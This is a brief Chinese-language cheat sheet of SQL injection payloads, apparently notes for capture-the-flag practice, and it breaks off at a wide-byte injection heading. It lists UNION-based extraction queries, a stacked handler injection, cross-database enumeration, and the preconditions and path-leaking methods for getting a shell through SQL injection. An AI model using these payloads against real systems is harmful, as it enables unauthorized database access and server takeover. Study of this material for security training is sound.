# sql注入

1' or 1=1# 查看是否存在注入

1'  order by 10# 查看字段

' union select 1,2,3,4 # 显示字段

' union select 1,databases()# 显示数据库

' union select 1,table_name from information_schema.tables where table_schema='databases' 查看表名

# 堆叠注入

;handler FlagHere open;handler FlagHere read first;-


# 跨库注入
* 必须条件，数据库的用户必须是root用户

查看是否是root用户
union select user()%23

然后查看所有数据库名
union select group_concat(schema_name) from information_schema.schemata%23


# sql注入GetShell

* sql注入GetShell的必要条件，数据库的用户必须是root用户

	* union select user()%23

* 必须知道绝对路径，而且数据库配置文件中的secure_file_priv要等于空值
	1. 通过错误爆出路径
	2. 通过网站的遗留文件爆出路径（例如： phpinfo等）
	3. 通过漏洞爆出路径
	4. 根据对方的web服务器类型猜路径

# 多种方式注入

* GET 
	- 直接?就行了（例：?id=plaody）

* POST
	- POST请求就是用于表单
	- 可以在表单里注入

* cookie
	- cookie注入就是在cookie里注入sql语句
	- 前提是要得有cookie
	- 注入方式可以使用burpstuie进行注入


# 参数注入类型

* 数字型
	- select * from user where id=1
	- select * from user where id=-1 union select 1,2,3

* 字符型
	- select * from user where id='str'
	- select * from user where id='-1' union select 1,2,3 --+'

* 搜索型
	- select * from user where user like id='%str%'
	- select * from user where user like id='%%'union select 1,2,3 '%%'

# 宽字节注入

宽字节注入一般
